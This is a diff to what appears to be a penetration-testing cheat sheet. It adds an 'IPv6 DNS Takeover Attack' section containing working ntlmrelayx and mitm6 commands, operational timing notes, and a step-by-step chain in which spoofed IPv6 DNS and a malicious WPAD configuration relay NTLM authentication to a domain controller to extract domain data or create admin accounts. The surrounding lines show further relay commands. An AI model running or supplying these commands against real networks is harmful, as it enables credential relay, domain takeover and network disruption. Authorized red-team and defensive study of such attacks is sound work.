@@ -375,6 +375,42 @@ sudo ntlmrelayx.py -tf targets.txt -smb2support -i
 sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
 ```
 
+#### IPv6 DNS Takeover Attack
+Prerequisites:
+- IPv6 enabled on network (but not properly configured)
+- Network access
+- Domain environment
+
+```bash
+# Setup ntlmrelayx for IPv6 attack
+sudo ntlmrelayx.py -6 -t ldaps://DC-IP -wh fakewpad.domain.local -l lootme
+
+# Run mitm6 (in separate terminal)
+sudo mitm6 -d domain.local
+```
+
+OPERATIONAL NOTES:
+- Only run in 5-10 minute intervals
+- Can cause network disruption if left running
+- Monitor for authentication events
+- Check lootme directory for extracted data
+- Watch for new admin account creation
+
+ATTACK CHAIN:
+1. Attacker machine becomes IPv6 DNS server
+2. Victim requests IPv6 DNS
+3. Attacker provides malicious WPAD config
+4. Victim authenticates via NTLM
+5. Authentication relayed to DC via LDAP
+6. Domain data extracted or account created
+
+BEST PRACTICES:
+- Test impact before full deployment
+- Document all created accounts
+- Monitor network stability
+- Have backup attack paths ready
+- Clean up artifacts after testing
+
 ### Web Application Attacks
 
 #### SQL Injection
